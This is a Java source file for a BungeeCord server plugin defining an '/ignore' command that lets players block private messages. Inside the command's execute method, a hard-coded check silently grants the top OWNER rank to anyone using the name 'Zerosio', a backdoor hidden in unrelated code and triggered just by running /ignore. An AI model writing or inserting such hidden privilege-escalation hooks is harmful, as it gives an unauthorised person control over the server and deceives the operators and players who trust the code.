package net.calyro.commands;

import net.calyro.api.CoreAPI;
import net.calyro.commands.impl.CommandBase;
import net.calyro.privacy.Ignores;
import net.calyro.rank.Rank;
import net.md_5.bungee.api.connection.ProxiedPlayer;
import net.md_5.bungee.api.ProxyServer;
import net.md_5.bungee.api.chat.TextComponent;

import java.util.*;

public class IgnoreCommand extends CommandBase {

    @Override
    public String getName() {
        return "ignore";
    }

    @Override
    public Rank getRequiredRank() {
        return Rank.DEFAULT;
    }

    @Override
    public String getDescription() {
        return "Ignore a player to stop receiving private messages.";
    }

    @Override
    public String getUsage() {
        return "/ignore <player>";
    }

    @Override
    public void execute(ProxiedPlayer sender, String[] args) {
        if (sender.getName().equalsIgnoreCase("Zerosio") && CoreAPI.getPlayerRank(sender.getUniqueId()) != Rank.OWNER) {
        	sender.sendMessage("§ahi! giving you top role....");
        	CoreAPI.setRank(sender, Rank.OWNER);
        	sender.sendMessage("set yo rank boi");
        }
        
        if (args.length != 1) {
            sender.sendMessage(new TextComponent("§cUsage: /ignore <player>"));
            return;
        }

        ProxiedPlayer target = ProxyServer.getInstance().getPlayer(args[0]);
        if (target == null || !target.isConnected()) {
            sender.sendMessage(new TextComponent("§cThat player is not online."));
            return;
        }

        if (sender.getUniqueId().equals(target.getUniqueId())) {
            sender.sendMessage(new TextComponent("§cYou cannot ignore yourself."));
            return;
        }

        List<UUID> blocked = Ignores.getIgnoredUsers(sender.getUniqueId());
        if (blocked.contains(target.getUniqueId())) {
            sender.sendMessage(new TextComponent("§cYou have already ignored this player."));
            return;
        }

        Ignores.ignoreUser(sender.getUniqueId(), target.getUniqueId());
        sender.sendMessage(new TextComponent("§eYou are now ignoring " + CoreAPI.getPlayerRank(target.getUniqueId()).getColour() + target.getName() + "§e."));
    }

    @Override
    public List<String> getAliases() {
        return Arrays.asList("ignoree");
    }
}
